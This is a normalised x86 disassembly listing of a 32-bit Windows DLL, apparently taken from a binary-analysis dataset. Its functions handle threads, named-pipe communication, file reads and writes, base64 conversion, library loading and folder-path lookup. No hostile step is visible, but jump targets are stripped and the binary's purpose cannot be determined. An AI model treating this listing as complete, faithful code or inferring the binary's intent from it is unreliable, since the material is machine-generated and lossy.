mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001f2b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x8 ]
add ecx esi
add ecx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_100021a7
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
add edx ebx
push edx
sub eax esi
push eax
add ecx esi
push ecx
call sub_1000218b
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10001f2b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001f2b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov edx [ ebp + 0x14 ]
add ecx edx
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
push ecx
push eax
push ebx
call sub_10001f2b
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
sub ecx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001f2b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x18 ]
sub eax esi
add ebx esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add ecx edx
add ecx [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0xc ]
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
sub_100167c0
push 0xc
mov eax sub_1004f9bf
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10027b31
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10022358
lea eax [ ebp - 0x18 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006c37
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10022358
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006c37
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10022358
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006c37
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10022358
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_10022358
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_1002b37e
retn 0x8
call sub_10022358
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006c37
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10022358
mov [ esi + 0xc ] 0x2e
call sub_10022358
mov [ esi + 0xd ] 0x2c
sub_1001689a
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_100167c0
mov eax esi
call sub_1002b37e
retn 0xc
sub_100168d0
push 0x98
mov eax sub_10050270
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_100078da
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_1001689a
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_10016973
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100168d0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10016a10
push 0x2c
mov eax sub_10050df1
call sub_1002b2a6
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push esi
push sub_10016b36
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
call [ CreateThread@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x14 ] eax
call sub_10001ebc
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x38 ]
push eax
sete al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_100020e2
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
call sub_100148e3
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov [ esi ] r--data
mov [ esi + 0x10 ] bl
mov [ esi + 0x11 ] bl
mov [ esi + 0x14 ] ebx
mov eax esi
call sub_1002b37e
retn 0x8
sub_10016abb
push 0x24
mov eax sub_1005191b
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
push edi
push eax
call [ TerminateThread@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov ebx eax
call sub_10001ebc
lea eax [ ebp - 0x30 ]
push eax
cmp ebx edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001486a
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
jmp r-xdata
mov ecx esi
mov [ esi ] r--data
call sub_10016c58
call sub_1002b37e
retn
sub_10016b36
push 0x8
push r--data
call sub_1002fdfc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10016b78
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002fe41
retn 0x4
sub_10016b78
push 0x8
push r--data
call sub_1002fdfc
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x1
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
jmp sub_10016bcb
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
jmp sub_10016bcb
sub_10016bda
push 0x48
mov eax sub_100529c8
call sub_1002b2a6
push 0x10
push 0x0
push [ ebp + 0x8 ]
call sub_10027650
add esp 0xc
push [ ebp + 0x8 ]
call [ CoCreateGuid@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_1002ae74
sub_10016c58
push esi
lea esi [ ecx + 0x4 ]
mov eax [ esi ]
test eax eax
jne r-xdata
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
push [ esi ]
call [ CloseHandle@IAT ]
sub_10016c79
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push 0x1
push eax
call [ WaitNamedPipeW@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
xor al al
jmp r-xdata
cmp eax 0x79
jne r-xdata
call sub_1002b37e
retn
sub_10016cf4
push 0x38
mov eax sub_10050dce
call sub_1002b2a6
mov eax [ ebp + 0xc ]
xor edi edi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] edi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_1001708d
push esi
push esi
push edi
call sub_1000d3de
add esp 0xc
mov eax edi
call sub_1002b37e
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ CreateNamedPipeW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_100020e2
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001ebc
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x44 ]
call sub_100020e2
push 0x8
call sub_1002738b
pop ecx
cmp eax esi
je r-xdata
sub_10016dd9
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0x0
push eax
call [ ConnectNamedPipe@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call [ GetLastError@IAT ]
cmp eax 0x217
je r-xdata
call sub_1002b37e
retn 0x4
sub_10016e42
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov edi ecx
and [ ebp - 0x10 ] 0x0
push 0x8
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_1001708d
push esi
push esi
push ebx
call sub_1000d3de
add esp 0xc
mov eax ebx
call sub_1002b37e
retn
push edi
call sub_100170ea
mov [ esi ] r--data
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
jmp r-xdata
sub_10016eb3
push 0xc
mov eax sub_100518cb
call sub_1002b2a6
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_100025cf
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax 0x200
lea esi [ edi + 0x3c ]
mov [ edi + 0x20 ] 0x3
mov [ edi + 0x24 ] ebx
mov [ edi + 0x28 ] 0xff
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] ebx
mov [ edi + 0x38 ] ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_10017022
mov [ ebp - 0x4 ] 0x2
call sub_10017055
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
je r-xdata
mov eax edi
call sub_1002b37e
retn 0x8
call sub_1000af0a
sub_10016f50
push 0x4
mov eax sub_1004feba
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x40 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_1000264e
call sub_1002b37e
retn
call sub_1000af0a
sub_10016f89
push 0xc
mov eax sub_10051892
call sub_1002b2a6
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
add ebx 0x3c
mov eax [ ebx ]
mov [ edi ] eax
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000af36
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ edi ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
push [ edi ]
call sub_10016dd9
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10017022
mov esi ebx
mov [ ebp - 0x4 ] 0x2
call sub_10017055
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10017022
mov [ ebp - 0x4 ] esi
mov esi edi
call sub_10017055
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax edi
call sub_1002b37e
retn 0x8
call sub_1000af0a
call sub_1000af0a
sub_10017022
push ebp
mov ebp esp
push ecx
push [ eax + 0x38 ]
and [ ebp - 0x4 ] 0x0
push [ eax + 0x34 ]
add eax 0x4
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ eax + 0x24 ]
push [ eax + 0x20 ]
push [ eax + 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_10016cf4
mov eax [ ebp + 0x8 ]
add esp 0x24
leave
retn 0x4
sub_10017055
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x8 ] ecx
push eax
lea ecx [ ebp - 0x4 ]
call sub_1000af36
lea eax [ ebp - 0x8 ]
cmp eax esi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax esi
leave
retn
call sub_1000af0a
sub_1001708d
push 0x4
mov eax sub_1004f9a4
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_100170ea
push 0x40
mov eax sub_10050da3
call sub_1002b2a6
xor edi edi
push edi
push edi
push 0x3
push edi
push edi
push 0x3
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] eax
call sub_10001ebc
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x2c ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push esi
lea ecx [ ebp - 0x48 ]
call sub_10001ebc
cmp [ ebp - 0x10 ] 0xffffffff
lea eax [ ebp - 0x48 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001486a
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x10 ]
call sub_1002b37e
retn
sub_1001717b
push 0x64
mov eax sub_1005184e
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ WriteFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_1002b37e
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001ebc
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_1002ae74
sub_10017217
push 0x64
mov eax sub_10051822
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ ReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_1002b37e
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001ebc
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_1002ae74
sub_10017316
push 0x4c
mov eax sub_10050d78
call sub_1002b2a6
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x18 ] esi
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x14 ] esi
jb r-xdata
add eax 0x4
mov [ ebp - 0x10 ] eax
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
push [ ebp - 0x14 ]
mov esi eax
call sub_100172b3
jmp r-xdata
push esi
push esi
lea edx [ ebp - 0x14 ]
push edx
push esi
xor ebx ebx
inc ebx
push ebx
push ecx
push eax
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov edi eax
call sub_10001ebc
lea eax [ ebp - 0x38 ]
push eax
cmp edi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001486a
pop ecx
pop ecx
push esi
push ebx
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x0
call sub_100020e2
push 0x20
call sub_1002738b
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax esi
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov edi eax
call sub_10015618
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax esi
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov [ ebp - 0x18 ] ebx
jb r-xdata
push edi
push edi
lea esi [ ebp - 0x14 ]
push esi
push eax
push ebx
push edx
push ecx
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x54 ]
mov esi eax
call sub_10001ebc
lea eax [ ebp - 0x54 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001486a
pop ecx
pop ecx
push edi
push ebx
lea ecx [ ebp - 0x54 ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
mov ecx [ ecx ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
cmp [ ecx + 0x18 ] 0x10
mov ecx [ ebp - 0x10 ]
jb r-xdata
sub_1001743a
push 0x68
mov eax sub_10050d20
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi ecx
xor edx edx
cmp [ esi + 0x1c ] 0x10
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] edx
jb r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp [ esi + 0x1c ] 0x10
mov eax [ esi + 0x18 ]
jb r-xdata
lea ecx [ ebp - 0x28 ]
lea edi [ ebp - 0x30 ]
push edi
mov edi [ CryptBinaryToStringA@IAT ]
push edx
xor ebx ebx
inc ebx
push ebx
push eax
push ecx
call edi
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] ebx
lea eax [ ebp - 0x54 ]
push eax
setne al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x54 ]
call sub_100020e2
push 0x0
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
dec ecx
push ecx
mov ecx [ ebp - 0x38 ]
push eax
call sub_1000dd07
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x38 ]
call sub_1002b392
retn
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0x30 ]
push edx
push ecx
push ebx
push eax
push esi
call edi
push r--data
lea ecx [ ebp - 0x70 ]
mov esi eax
call sub_10001ebc
lea eax [ ebp - 0x70 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001486a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] bl
call sub_100020e2
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
sub_1001754c
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ LoadLibraryW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test edi edi
sete al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
sub_100175d2
push 0x20
mov eax sub_10050ced
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
call sub_1002b37e
retn
push eax
call [ FreeLibrary@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov ebx eax
call sub_10001ebc
lea eax [ ebp - 0x2c ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
and [ esi + 0x4 ] 0x0
sub_1001763e
push 0x298
mov eax sub_10050209
call sub_1002b30f
xor esi esi
push 0x208
lea eax [ ebp - 0x218 ]
push esi
push eax
mov [ ebp - 0x21c ] esi
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x218 ]
push eax
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ SHGetFolderPathW@IAT ]
cmp eax 0x1
jne r-xdata
cmp eax 0x80004005
jne r-xdata
push r--data
lea ecx [ ebp - 0x238 ]
call sub_10001ebc
mov [ ebp - 0x4 ] esi
cmp eax 0x80070057
jne r-xdata
push r--data
lea ecx [ ebp - 0x238 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax esi
je r-xdata
push r--data
lea ecx [ ebp - 0x238 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp - 0x260 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x260 ]
lea eax [ ebp - 0x218 ]
push eax
mov ecx ebx
call sub_10001362
mov eax ebx
call sub_1002b392
retn
push r--data
lea ecx [ ebp - 0x27c ]
call sub_10001ebc
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x2a4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001eec
push r--data
lea eax [ ebp - 0x2a4 ]
jmp r-xdata
push eax
call sub_1002ae74
sub_10017748
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx eax
push 0x0
call sub_1001763e
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_10017760
push ecx
push ecx
and [ esp + 0x4 ] 0x0
